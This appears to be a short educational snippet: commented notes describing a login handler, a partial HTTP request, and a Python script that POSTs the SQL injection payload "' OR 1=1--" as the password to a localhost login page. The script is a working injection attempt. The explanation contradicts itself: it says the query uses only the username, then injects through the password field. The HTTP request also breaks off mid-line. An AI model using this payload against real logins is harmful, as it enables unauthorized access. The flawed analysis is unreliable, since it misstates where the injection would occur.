
#
#1. It is taking the username and password from the request.
#2. It is connecting to the database.
#3. It is executing a query to get the password for the given username.
#4. It is comparing the password from the request with the password from the database.
#5. It is returning the result of the comparison.
#
#The problem is that the code is vulnerable to SQL injection.
#
#The following is a sample request that can be used to exploit the vulnerability:
#
#POST /login HTTP/1.1
#Host: localhost:5000
#Content-Length: 29
#Cache-Control: max-age=0
#Origin: http://localhost:5000
#Upgrade-Insecure-Requests: 1
#User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.30

import requests

url = 'http://localhost:5000/login'

data = {'username': 'admin', 'password': '\' OR 1=1--'}

r = requests.post(url, data=data)

print(r.text)